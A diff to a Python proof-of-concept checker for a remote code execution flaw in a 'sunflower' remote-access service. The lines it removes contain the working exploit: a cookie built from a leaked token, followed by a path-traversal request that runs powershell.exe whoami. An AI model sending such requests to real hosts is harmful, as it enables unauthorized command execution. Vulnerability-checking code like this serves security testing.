@@ -41,19 +41,10 @@ class sunflower_RCE_POC(POCBase):
                 
                 resq = requests.post(vulurl, headers=headers, timeout=self.timeout, data=data,verify=False)
                 print ("resq.txt")
-                c = json.loads(resq.text)
-                verify_string = c['verify_string']
                 if resq.status_code == 200:
                     if "verify_string" in resq.text:
-                        cookies = "CID=" + verify_string
-                        pocurl = target + "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami"
-                        header = {
-                            "Cookie": "{}".format(cookies)
-                        }
-                        resp = requests.get(pocurl, headers=header,timeout=self.timeout,verify=False)
-                        if "system" in resp.text or "authority" in resp.text:
-                            result['VerifyInfo'] = {}
-                            result['VerifyInfo']['URL'] = target
+                        result['VerifyInfo'] = {}
+                        result['VerifyInfo']['URL'] = target
             except Exception as e:
                 print(e)
 
